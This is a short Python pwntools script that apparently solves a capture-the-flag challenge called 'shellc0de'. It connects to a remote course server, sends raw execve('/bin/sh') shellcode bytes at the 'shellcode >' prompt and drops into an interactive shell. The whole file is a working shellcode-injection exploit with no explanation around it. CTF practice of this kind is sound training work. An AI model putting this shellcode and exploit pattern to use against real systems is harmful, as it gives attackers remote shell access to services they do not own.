#coding=utf-8
from pwn import *

p = remote('edu-ctf.csie.org', 10150)
#p = process('./shellc0de')
context.binary = './shellc0de'

#payload = shellcraft.amd64.sh()
#payload = asm(payload)
payload = '\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x99\x52\x57\x54\x5E\xB0\x3B\xCD\x80'
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
print payload

p.sendlineafter('shellcode >', payload)
#print p.recvall(1)
p.interactive()
